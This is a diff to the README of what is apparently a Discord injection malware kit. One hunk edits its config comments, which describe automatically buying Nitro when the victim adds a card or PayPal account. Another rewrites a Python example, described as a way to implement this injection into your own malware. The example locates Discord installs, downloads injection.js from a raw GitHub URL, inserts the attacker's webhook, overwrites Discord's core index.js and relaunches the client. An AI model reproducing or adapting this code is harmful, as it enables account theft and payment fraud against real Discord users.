@@ -71,7 +71,7 @@ Copy the raw url of the [injection](./injection.js) and then paste it in your co
 
 ```javascript
 const config = {
-    auto_buy_nitro: true, //automatically buys nitro when the victim adds credit card or paypal account
+    auto_buy_nitro: true, //automatically buys nitro when the victim adds credit card or paypal account or tries to buy nitro themselves
     ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
     ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
     embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
@@ -89,28 +89,20 @@ const config = {
 Example of how you can implement this injection into your own malware
 ```py
 import os
+import re
 import requests
 webhook = 'https://discord.com/apwebhooks/123456789/abcdefghijklmnopqrstuvwxyz'
 
 def inject():
-    for root, dirs, files in os.walk(os.getenv('localappdata')):
-        for name in dirs:
-            if "discord_desktop_core-" in name:
-                try:
-                    directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
-                except FileNotFoundError:
-                    pass
-                try:
-                    os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\initiation"))
-                except FileExistsError:
-                    pass
-                f = requests.get("https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", webhook)
-                with open(directory_list, 'w', encoding="utf-8") as index_file:
-                    index_file.write(f)
-    for root, dirs, files in os.walk(os.getenv('appdata')+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
-        for name in files:
-            discord_file = os.path.join(root, name)
-            os.startfile(discord_file)
+    for _dir in os.listdir(os.getenv('localappdata')):
+        if 'discord' in _dir.lower():
+            for __dir in os.listdir(os.path.abspath(os.getenv('localappdata')+os.sep+_dir)):
+                if re.match(r'app-(\d*\.\d*)*', __dir):
+                    abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir) 
+                    f = requests.get("https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", webhook)
+                    with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
+                        indexFile.write(f)
+                    os.startfile(abspath+os.sep+_dir+'.exe')
 
 if __name__ == "__main__":
     inject()
